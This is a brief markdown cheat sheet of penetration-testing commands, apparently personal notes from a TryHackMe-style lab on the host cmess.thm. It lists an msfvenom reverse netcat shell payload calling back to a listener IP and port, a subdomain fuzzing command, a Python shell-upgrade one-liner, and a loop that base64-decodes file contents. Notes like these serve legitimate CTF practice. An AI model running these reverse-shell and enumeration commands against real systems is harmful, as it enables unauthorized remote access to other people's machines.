# Important Commands

| Command | Description |
| :--- | :--- |
| Inline Paylod Linux | msfvenom -p cmd/unix/reverse\_netcat lhost=10.11.28.212 lport=8888 R |
| Subdomains from wordlist | fuzz -c -f sub-fighter -w **list.txt** -H "Host: FUZZ.**cmess.thm**" --**hw 290 -t 100** -u '[**http://cmess.thm**](http://cmess.thm)' |
| Full TTY | python3 -c 'import pty; pty.spawn\("/bin/bash"\)' |
| Find files and then base64 decode the content | for i in $\(find . -name "\*.php" \); do tail -1 $i \| base64 -d; echo; done; |



